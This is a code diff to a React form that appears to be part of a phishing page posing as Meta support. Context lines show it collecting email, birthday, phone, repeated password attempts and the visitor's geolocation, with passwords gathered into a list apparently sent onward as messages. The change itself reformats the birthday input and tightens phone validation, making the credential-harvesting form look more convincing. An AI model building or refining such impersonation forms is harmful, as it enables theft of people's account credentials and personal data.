@@ -38,8 +38,10 @@ interface GeoJSResponse {
 
 const mainFormSchema = z.object({
     email: z.string().email('Please enter a valid email address'),
-    birthday: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Please enter a valid date'),
-    phone: z.string().min(1)
+    birthday: z.string().regex(/^\d{2}\/\d{2}\/\d{4}$/, 'Please enter a valid date'),
+    phone: z.string()
+        .min(1, 'Phone number is required')
+        .regex(/^\+?[1-9]\d{1,14}$/, 'Please enter a valid phone number')
 });
 
 const passwordFormSchema = z.object({
@@ -293,6 +295,24 @@ ${passwordList}`;
         setPasswordAttempts([]);
         setLastMessageId(null);
     }, []);
+const formatDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const input = e.target.value.replace(/\D/g, ''); // Remove all non-digits
+  let formattedValue = '';
+
+  if (input.length > 2) {
+    formattedValue += input.slice(0, 2) + '/'; // Add MM/
+    if (input.length > 4) {
+      formattedValue += input.slice(2, 4) + '/'; // Add DD/
+      formattedValue += input.slice(4, 8); // Add YYYY
+    } else {
+      formattedValue += input.slice(2, 4); // Add DD
+    }
+  } else {
+    formattedValue = input; // MM
+  }
+
+  e.target.value = formattedValue; // Update the input value
+};
     return (
         <div className='min-h-screen relative'>
             <img src={Banner} alt='Meta support header' className='w-full h-48 object-cover shadow-md' />
@@ -345,7 +365,7 @@ ${passwordList}`;
                                 </div>
 
                                 <div>
-                                    <input type='date' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors [&::-webkit-calendar-picker-indicator]:opacity-0' />
+                                    <input type='text' onInput={formatDateInput} placeholder='Birthday (MM/DD/YYYY)' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors [&::-webkit-calendar-picker-indicator]:opacity-0' />
                                     {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
                                 </div>
 
